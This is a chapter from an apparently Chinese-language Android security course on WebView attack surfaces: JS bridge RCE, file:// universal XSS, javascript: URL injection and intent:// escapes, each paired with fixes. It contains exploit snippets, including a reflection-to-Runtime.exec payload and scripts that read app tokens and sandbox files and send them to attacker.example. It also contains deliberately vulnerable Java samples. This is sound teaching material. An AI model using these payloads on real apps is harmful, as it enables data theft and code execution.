# Ch 8 — WebView 攻擊面

> **目標**：把 WebView 這個「App 裡的瀏覽器」的攻擊面挖到底。你要能講清楚 `addJavascriptInterface` 為什麼是經典 RCE、`@JavascriptInterface` 註解在 API 17 後改了什麼又為什麼還是常被濫用；`setAllowFileAccessFromFileURLs` + `file://` 如何造成 universal XSS 讀走整個 App 沙箱；`loadUrl("javascript:...")` 注入、`shouldOverrideUrlLoading` 的信任誤區、以及網頁如何用 `intent://` scheme 從 WebView 逃逸去喚起內部元件。這是把 Ch 7 的「任意 URL 進 App」升級成「在 App 進程裡執行程式碼」的一章。

> **環境**：所有 Java/JS/HTML 範例手寫、語法正確、標出漏洞點。JS bridge 的注入行為與 `file://` UXSS 需要真實 WebView 執行，本 repo 沙箱無 Android/WebView，標「**未實測，理論預期行為**」並附驗證步驟；能純邏輯/字串驗的（`intent://` 解析、URL 判斷）用 **Python 3.12** 實跑標「**實際輸出**」。**版本行為是本章核心**，每個 API 都標明它在哪個 API level 改過預設值或語意。這章的輸入來自 [Ch 7 deeplink](./07-deeplink-task-hijacking.md)，是練習 B RCE 鏈的出口。

## 為什麼需要這個？

WebView 是把「Web 的攻擊面」整包搬進 App 進程的元件。一個普通瀏覽器裡的 XSS 頂多偷 cookie、打同源的 API；但 WebView 跑在 **App 的進程與沙箱裡**，如果 App 又給它開了一座通往原生 Java 的橋（JS bridge），那網頁上的 JavaScript 就能呼叫 App 的 Java 方法——輕則讀 App 私有資料、重則直接 `Runtime.exec` 執行任意指令。這是安卓 App 漏洞裡「投報率最高」的一類：很多 App 為了做混合式 UI 大量用 WebView，而 WebView 的安全設定預設值又隨版本一直變，開發者常設錯。

更關鍵的是**它是一條鏈的終點**。Ch 7 教你怎麼把任意 URL 塞進 App；只要那個 URL 最後進了一個開了危險設定的 WebView，你就從「App 顯示了一個網頁」升級成「在 App 裡執行你的程式碼」。練習 B 走的正是 `deeplink(任意 URL) → WebView(JS bridge) → RCE` 這條完整鏈，這章是它的技術核心。

## 先建立直覺：WebView 是穿了 App 皮的瀏覽器

把 WebView 想成「嵌在 App 裡的 Chrome，但共用 App 的身分與檔案權限」：

```
   ┌──────────────── App 進程 (UID = App 自己) ────────────────┐
   │                                                            │
   │   原生 Java 層                    WebView（渲染引擎）       │
   │   ┌─────────────┐               ┌──────────────────────┐  │
   │   │ JsBridge    │◀── JS 呼叫 ───│  網頁 JavaScript      │  │
   │   │  .getToken()│   (橋)         │  window.bridge.xxx() │  │
   │   │  .exec(cmd) │──── 回傳 ─────▶│                       │  │
   │   └─────────────┘               │  DOM / fetch / file:// │  │
   │        │                        └──────────────────────┘  │
   │        ▼  能碰 App 私有檔、SharedPrefs、SQLite、Runtime    │
   │   /data/data/com.app/...  ← 網頁的 JS 透過橋間接摸得到     │
   └────────────────────────────────────────────────────────────┘
```

三個要害同時決定了危險程度：

1. **JS bridge（`addJavascriptInterface`）**：有沒有把 Java 物件暴露給 JS。有橋，網頁就能呼叫 Java。
2. **載入的內容可不可控**：App 載入的是自家打包的 `file:///android_asset/index.html`（相對安全），還是能被外部塞進**任意 URL**（Ch 7 的 deeplink 就是塞法）。內容可控 + 有橋 = 火藥。
3. **file access 設定**：WebView 能不能讀 `file://`、跨 `file://` 存取——決定 XSS 能不能升級成「讀走整個沙箱」。

這章逐一拆這三個要害。核心心智模型：**WebView 的每個「方便功能」都是把 Web 世界與 App 沙箱之間的牆拆掉一塊**，拆得越多攻擊面越大。

## 底層機制一：addJavascriptInterface — 從注入到 RCE

`addJavascriptInterface(obj, "name")` 把一個 Java 物件塞進 JS 的全域，網頁就能用 `window.name.method()` 呼叫它的方法。這是 JS↔Java 橋的本體，也是 WebView 最經典的洞。它的危險度**隨 API level 分成兩個時代**：

**API 17 之前（Android 4.1 以下）——無限制，等於 RCE**：任何被暴露的物件，JS 都能用 **Java 反射**穿透到 `getClass()`、進而 `Runtime.getRuntime().exec(...)`。也就是說**只要開了 `addJavascriptInterface` 且網頁可控，就是任意指令執行**，不管你暴露的方法多無害：

```javascript
// API 17 之前：透過反射從任何暴露物件逃逸到 Runtime.exec
// （bridge 是被 addJavascriptInterface 暴露的物件，方法本身不重要）
function pwn(cmd) {
  var r = bridge.getClass()                       // 反射拿 Class
            .forName("java.lang.Runtime")
            .getMethod("getRuntime", null)
            .invoke(null, null);
  r.getClass().getMethod("exec", ["".getClass()]) // 呼 Runtime.exec
   .invoke(r, ["/system/bin/sh", "-c", cmd]);
}
pwn("id");   // 在 App 進程裡執行任意指令
```

這對應歷史 CVE-2012-6636 等一連串問題。**API 17 是分水嶺**：Google 加了一道限制——只有**標了 `@JavascriptInterface` 註解的方法**才會暴露給 JS，堵死了「用反射跳到 `getClass`」這條逃逸路。

**API 17 及之後——需 `@JavascriptInterface`，但濫用照樣危險**：反射逃逸被堵，但**你暴露的方法本身如果就很危險，一樣完蛋**。開發者常暴露一些「方便」的方法給前端用，卻沒想到這些方法在攻擊者手上是武器：

```java
public class JsBridge {
    Context ctx;
    @JavascriptInterface                          // API 17+ 必須標這個才會暴露
    public String readFile(String path) {         // ← 危險：任意檔讀取
        return new String(Files.readAllBytes(Paths.get(path)));
    }
    @JavascriptInterface
    public String getToken() {                    // ← 危險：把 App 的 token 送給網頁
        return ctx.getSharedPreferences("auth", 0).getString("token", "");
    }
    @JavascriptInterface
    public void runShell(String cmd) throws Exception {   // ← 直接 RCE
        Runtime.getRuntime().exec(cmd);
    }
}
// 註冊
webView.getSettings().setJavaScriptEnabled(true);
webView.addJavascriptInterface(new JsBridge(getApplicationContext()), "bridge");
```

網頁只要能被載入（Ch 7 的 deeplink 餵進來），JS 就能：

```javascript
// API 17+：不用反射，直接呼叫被暴露的危險方法
bridge.runShell("id");                                  // RCE
var token = bridge.getToken();                          // 偷 token
var secret = bridge.readFile("/data/data/com.app/databases/secret.db"); // 讀沙箱
fetch("https://attacker.example/x?t=" + token + "&s=" + btoa(secret));  // 外傳
```

> **失敗案例／邊界**：如果 App target API ≥ 17 且**沒有**任何 `@JavascriptInterface` 方法做危險事，單純開 bridge 不必然 = RCE——攻擊面取決於**你暴露了什麼方法**。反過來，即使只暴露一個「看似無害」的方法，只要它把 `Context`、`File`、反射能力間接漏出去，就可能被串成利用。評估時不能只看「有沒有 bridge」，要看「bridge 暴露了什麼」。

> **未實測，理論預期行為**：上述 JS payload 需在真實 WebView 執行。驗證步驟：在 AndroGoat / DIVA 的 WebView 關卡，用 `adb shell am start` 觸發載入你控制的 HTML，於頁面放 `bridge.xxx()` 呼叫並看 logcat / 外傳請求確認。**只在授權靶上做**。

## 底層機制二：file:// 存取與 universal XSS

WebView 有三個控制 `file://` 存取的設定，它們的**預設值隨 API level 變過**，是誤配重災區：

| Setting | 作用 | 危險 |
|---|---|---|
| `setAllowFileAccess` | WebView 能否載入 `file://` URL | 開著且能載入任意 file，可讀本地檔 |
| `setAllowFileAccessFromFileURLs` | `file://` 頁面能否用 JS 讀**其他** `file://` | universal XSS 的鑰匙 |
| `setAllowUniversalAccessFromFileURLs` | `file://` 頁面能否 JS 存取**任意來源**（含 http/其他 file） | 最危險，同源政策全開 |

版本行為（**這是本節重點**）：

- `setAllowFileAccess`：**API 29（Android 10）以前預設 `true`**，API 30+ 預設 `false`。也就是說老 App 或 targetSdk 低的 App，`file://` 存取預設就開著。
- `setAllowFileAccessFromFileURLs` 與 `setAllowUniversalAccessFromFileURLs`：**API 16（Jelly Bean）以後預設 `false`**——但開發者為了讓本地 HTML 能 `fetch` 資源，**常手動把它設回 `true`**，這一設就開了 universal XSS 的門。

危險鏈長這樣。假設 App 開了 `setAllowUniversalAccessFromFileURLs(true)`，而攻擊者能讓 WebView 載入一個 `file://` 路徑下、內容可控的 HTML（例如 App 把下載的檔案存到可預測路徑、或有路徑穿越把攻擊者的 HTML 寫進去）：

```java
// 漏洞設定：同時開 file access 與 universal access
WebSettings s = webView.getSettings();
s.setJavaScriptEnabled(true);
s.setAllowFileAccess(true);
s.setAllowUniversalAccessFromFileURLs(true);   // ← 致命：file:// 頁可存取任意來源
webView.loadUrl(attackerControlledFileUri);    // file:///sdcard/Download/evil.html
```

```html
<!-- evil.html 從 file:// 載入後，用 XHR 把 App 沙箱檔讀出來外傳 -->
<script>
  var x = new XMLHttpRequest();
  // universal access 開著 → file:// 頁可讀另一個 file://（同源限制被解除）
  x.open("GET", "file:///data/data/com.app/shared_prefs/auth.xml");
  x.onload = function () {
    // 再送去攻擊者伺服器（universal access 也允許跨源 http）
    fetch("https://attacker.example/x?d=" + btoa(x.responseText));
  };
  x.send();
</script>
```

這就是 **universal XSS**：一個 `file://` 上的 XSS 不再受同源限制，能讀走 `/data/data/com.app/` 底下**整個 App 沙箱**（SharedPrefs、SQLite、token 檔）再外傳。Oversecured 揭過大量真實 App 的這類洞。

> **未實測，理論預期行為**：`file://` 跨源讀取的實際成敗取決於 WebView 版本、targetSdk 與 setting 組合。驗證步驟：在靶 App 把上述 setting 打開，用 `adb push` 放一個 evil.html 到可載入路徑，觸發載入後看 logcat 與外傳請求。

## 底層機制三：loadUrl("javascript:...") 注入與 shouldOverrideUrlLoading

**`loadUrl("javascript:...")` 注入**：App 有時想從 Java 側對頁面注入 JS（例如填入使用者資料），用 `webView.loadUrl("javascript:setName('" + name + "')")`。若 `name` 來自外部又沒跳脫，攻擊者可注入任意 JS：

```java
// 漏洞：把外部可控字串直接拼進 javascript: URL
String name = getIntent().getStringExtra("name");        // 外部可控
webView.loadUrl("javascript:setName('" + name + "')");   // ← JS 注入
```

`name` 塞成 `');bridge.runShell('id');//` 就跳出字串上下文執行任意 JS——若又有 bridge，直通機制一的 RCE。正解是用 `evaluateJavascript` 並把資料當**參數**傳，或對插入值做 JSON 編碼，不要字串拼接。

**`shouldOverrideUrlLoading` 的信任誤區**：這個 callback 讓 App 攔截 WebView 裡的每一次導覽，決定「這個 URL 我自己處理還是讓 WebView 載」。開發者常在這裡做白名單，但常見兩個錯：

```java
@Override
public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest req) {
    String url = req.getUrl().toString();
    if (url.contains("trusted.example.com")) {   // ← 錯 1：contains 可被繞過
        return false;                            // 交給 WebView 載（信任）
    }
    startActivity(new Intent(Intent.ACTION_VIEW, req.getUrl())); // ← 錯 2：見機制四
    return true;
}
```

`contains("trusted.example.com")` 的繞過我在 Ch 7 用 Python 驗過同一類邏輯——`https://trusted.example.com@evil.com/` 或 `https://evil.com/trusted.example.com` 都可能騙過 `contains`。而「不是白名單就 `startActivity`」把 URL 交給系統開，正是下一節 `intent://` 逃逸的入口。

## 底層機制四：intent:// scheme — 從 WebView 逃逸喚起內部元件

WebView 裡的網頁除了 `http/https`，還能導覽到 `intent://` 這種特殊 scheme。若 App 在 `shouldOverrideUrlLoading` 裡用 `Intent.parseUri` 把它解析成 Intent 再 `startActivity`，**網頁就能構造一個 Intent 去喚起 App 內部元件**——包括沒 exported 的、或帶危險 extra 的：

```java
// 常見的危險寫法：把網頁給的 intent:// 解析後直接啟動
@Override
public boolean shouldOverrideUrlLoading(WebView v, WebResourceRequest req) {
    String url = req.getUrl().toString();
    if (url.startsWith("intent://")) {
        Intent i = Intent.parseUri(url, Intent.URI_INTENT_SCHEME); // 解析網頁給的 Intent
        startActivity(i);                                          // ← 漏洞：直接啟動
        return true;
    }
    return false;
}
```

網頁只要放一個 `intent://` URL，就能把 `package` / `component` / extra 全指定好。我用 Python 拆解一個惡意 `intent://` 的欄位（**實際輸出**）：

```
intent scheme 範例: intent://open
   scheme=myapp
   package=com.example.target
   S.url=file:///data/data/com.example.target/databases/secret.db
```

`S.url=...` 是塞給目標元件的字串 extra（`S.` 前綴代表 String extra）。攻擊者能藉此：喚起 App 內部**未匯出**的 Activity（因為是 App 自己在 `startActivity`，等於 App 幫攻擊者繞過 exported 限制——這就是 Ch 4 的 **confused deputy**）、或塞一個惡意 extra 觸發下游漏洞。若目標元件又把這個 extra 當 URL 餵回另一個 WebView，就形成套娃。

正確做法：解析出的 Intent 要**清掉危險欄位**（`i.setComponent(null); i.setSelector(null);`）、或只允許特定 scheme，最保險是用 `Intent.URI_ANDROID_APP_SCHEME` 並嚴格限制。Ch 4 的 intent redirection 防禦在這裡同樣適用。

> **未實測，理論預期行為**：`intent://` 逃逸的實際效果取決於目標 App 有哪些元件與如何處理 extra。驗證步驟：找靶 App 中會 `parseUri`+`startActivity` 的 WebView，構造 `intent://` 頁面觸發，用 `adb shell dumpsys activity` 觀察是否喚起了非預期元件。

## 對比與取捨

| 設定 / API | 開了的方便 | 攻擊面 | 安全預設 |
|---|---|---|---|
| `addJavascriptInterface` | 前端呼叫原生功能 | 網頁 → Java（RCE 起點） | 不用就別開；用就只暴露最小、無害的方法 |
| `@JavascriptInterface`（API 17+） | — | 反射逃逸被堵，但危險方法照樣危險 | 暴露的方法本身要當公開 API 審 |
| `setAllowFileAccessFromFileURLs` | 本地 HTML 讀本地資源 | file:// UXSS | 保持預設 `false` |
| `setAllowUniversalAccessFromFileURLs` | 本地 HTML 跨源 fetch | 讀整個沙箱 + 跨源外傳 | 保持預設 `false` |
| `loadUrl("javascript:")` 拼字串 | 快速注入資料 | JS 注入 | 改用 `evaluateJavascript` + JSON 編碼 |
| `parseUri` + `startActivity` | 支援 `intent://` 跳轉 | 逃逸喚起內部元件 | 清掉 component/selector，白名單 scheme |

核心取捨一句話：**WebView 的每個「開關」都是拿安全換方便**。評估一個 WebView 的攻擊面，就是把這張表逐項對照它的實際設定與暴露的 bridge 方法，看拆了哪幾塊牆、拆完能串出什麼。

## 踩雷集錦

1. **以為 API 17+ 有了 `@JavascriptInterface` 就安全**：註解只堵了「反射逃逸到 Runtime」，堵不了「你暴露的方法本身就危險」。一個 `readFile(path)` 或 `getToken()` 就足以造成資料外洩。看 bridge 不能只看有沒有，要看暴露了什麼。
2. **手動把 `setAllowUniversalAccessFromFileURLs` 設 true 圖方便**：這個預設 API 16 起就是 `false` 是有原因的。為了讓本地 HTML `fetch` 而打開它，等於把 file:// 頁的同源政策全拆——一個 XSS 就能讀走整個沙箱。改用 `WebViewAssetLoader` 走 `https://appassets` 虛擬網域載本地資源，別開 universal access。
3. **`shouldOverrideUrlLoading` 用 `contains`/`startsWith` 做白名單**：跟 Ch 7 同樣的坑，`contains("example.com")` 被 `evil.com/example.com` 或 userinfo 繞過。要精確比對 host。
4. **`loadUrl("javascript:...")` 字串拼接注入資料**：外部可控值拼進去就是 JS 注入。用 `evaluateJavascript("f(?)", value)` 的思路（把值 JSON 序列化後傳），不要拼字串。
5. **`parseUri` 出來的 Intent 直接 `startActivity`**：網頁可完全控制那個 Intent 的 component/package/extra，等於讓 App 幫攻擊者啟動任意（含未匯出）元件。解析後務必清 component/selector 並限制 scheme。
6. **忽略 `setAllowFileAccess` 在舊 targetSdk 預設 true**：targetSdk < 30 的 App，`file://` 存取預設開著。就算沒手動開 universal access，只要能載入可控的 file:// HTML + 有 bridge，仍是攻擊面。看攻擊面要連 targetSdk 一起看。

## 進階：再往深一層

- **`WebViewAssetLoader` 是正解**：Google 官方推薦用它把本地資源掛在 `https://appassets.androidplatform.net/` 這種虛擬 https 網域下載入，從根本上避免用 `file://` 載本地 HTML，也就不必開任何 file access setting。評估時看到 App 還在用 `file:///android_asset/` + 開 file access，就是可以建議修的點。
- **JS bridge 的「一個方法漏出全世界」**：即使只暴露一個回傳 `Context` 或 `Object` 的方法，JS 也可能透過它的欄位/方法鏈間接摸到危險能力。審 bridge 要看**方法回傳型別的可達性**，不只看方法名。Oversecured 有專文示範這種間接利用。
- **WebMessage / `postMessage` 的新橋**：現代 App 改用 `WebMessagePort` / `postWebMessage` 做 JS↔Java 通訊，比 `addJavascriptInterface` 安全（不暴露 Java 物件），但若 origin 校驗做錯一樣可被打。評估新 App 時要認得這種較新的橋。
- **WebView 本身的 CVE 與更新機制**：WebView 是 Google Play 系統元件（可獨立更新），但使用者不更新就會留著已知渲染引擎漏洞。App 層防不住底層 WebView 的 CVE，但評估報告可以標「建議提示使用者更新 WebView / 設定最低版本」。

## 動手練習

1. 在 AndroGoat / DIVA 的 WebView 關卡，用 jadx 找出它的 WebView 設定：`setJavaScriptEnabled`、`addJavascriptInterface`、三個 file access setting、`shouldOverrideUrlLoading`。列出它拆了牆表裡的哪幾塊。
2. 找出靶 App 的 JS bridge 暴露了哪些 `@JavascriptInterface` 方法，逐一評估「這個方法在攻擊者手上能做什麼」。找出最危險的那個。
3. 若靶 App 有可控載入點（deeplink 帶 `url=`），寫一個 HTML 放你控制的伺服器，載入後呼叫 bridge 方法（先從無害的 `alert` 或印 log 開始），確認橋真的通。這是練習 B 的核心步驟。
4. 拿 Ch 7 的 Python 片段，把 `contains` 白名單邏輯套在幾個 WebView 常見繞過 URL 上（userinfo、子網域、`intent://`），確認哪些會被錯誤放行。

## 本章重點整理

- **`addJavascriptInterface` 是 JS→Java 的橋，也是經典 RCE 起點**：API 17 前可反射逃逸到 `Runtime.exec`（無條件 RCE）；API 17 後需 `@JavascriptInterface`，但**暴露的危險方法照樣是洞**。
- **file access 三設定 + `file://` = universal XSS**：`setAllowUniversalAccessFromFileURLs(true)` 讓 file:// 頁的 XSS 能讀走整個 App 沙箱；預設 `false`（API 16+）是有理由的，別手動開。`setAllowFileAccess` 在 targetSdk < 30 預設 `true`。
- **`loadUrl("javascript:")` 字串拼接 = JS 注入**；**`parseUri`+`startActivity` = intent:// 逃逸喚起內部元件**（confused deputy）；`shouldOverrideUrlLoading` 用 `contains` 白名單可被繞過。
- 評估 WebView 攻擊面 = 對照「內容可不可控 × 有沒有 bridge × 拆了哪些 file/scheme 牆」，看能串出什麼鏈。

## 自我檢核

- [ ] 能說清楚 `addJavascriptInterface` 在 API 17 前後的差別，以及為什麼 API 17+ 仍可能 RCE
- [ ] 能解釋 `setAllowUniversalAccessFromFileURLs(true)` 為什麼讓 file:// XSS 升級成讀走整個沙箱
- [ ] 知道 `setAllowFileAccess` 的預設值在哪個 API level 變過，對評估有什麼影響
- [ ] 能指出 `loadUrl("javascript:...")` 字串拼接與 `parseUri`+`startActivity` 各自的漏洞與正解
- [ ] 拿到一個 WebView，能列出評估它攻擊面要看的每一個設定與 bridge 方法

## 延伸閱讀

- **[OWASP MASTG — Testing WebView Protocol / JavaScript Execution](https://mas.owasp.org/MASTG/tests/android/MASVS-PLATFORM/MASTG-TEST-0031/)**
  - **讀哪裡**：`addJavascriptInterface`、file access setting、`shouldOverrideUrlLoading` 的測試步驟
  - **學什麼**：把本章每個機制變成可執行的檢查清單
  - **關聯**：本章與練習 B 的方法論骨架
- **[Oversecured — Android WebView 漏洞系列](https://blog.oversecured.com/)**
  - **讀哪裡**：WebView / JS bridge / file access 相關文章，特別是「一個看似無害的 bridge 方法如何被串成利用」
  - **學什麼**：真實 App 的 WebView 誤配如何一路鏈成 RCE 與沙箱讀取
  - **關聯**：機制一、二的深度實戰版本，本課一手參考
- **[Android 官方 — WebView / WebSettings 文件](https://developer.android.com/reference/android/webkit/WebSettings)**
  - **讀哪裡**：`setAllowFileAccess`、`setAllowFileAccessFromFileURLs`、`setAllowUniversalAccessFromFileURLs` 每個方法的「Default value」與版本說明
  - **學什麼**：每個 setting 的預設值在哪個 API level 變過——本章版本行為的一手依據
  - **關聯**：機制二的版本表出處；也看 `WebViewAssetLoader` 這個正解
- **[HackTricks — Android WebView Attacks](https://book.hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/webview-attacks.html)**
  - **讀哪裡**：JS bridge、file:// XSS、intent:// 逃逸的可複製 payload
  - **學什麼**：實戰 payload 與快速判斷是否可利用
  - **關聯**：機制一、四的動手素材

WebView 是 App 的一個瀏覽器，而瀏覽器要連網——下一站是網路層本身：這些 WebView、這些 API 呼叫的流量走的是明文還是加密？有沒有 pinning？`network_security_config` 有沒有被誤配成信任使用者憑證？看不到流量就談不上完整評估。

→ [Ch 9 網路層漏洞：明文、pinning 缺失、network_security_config 誤配](./09-network-layer-vulns.md)
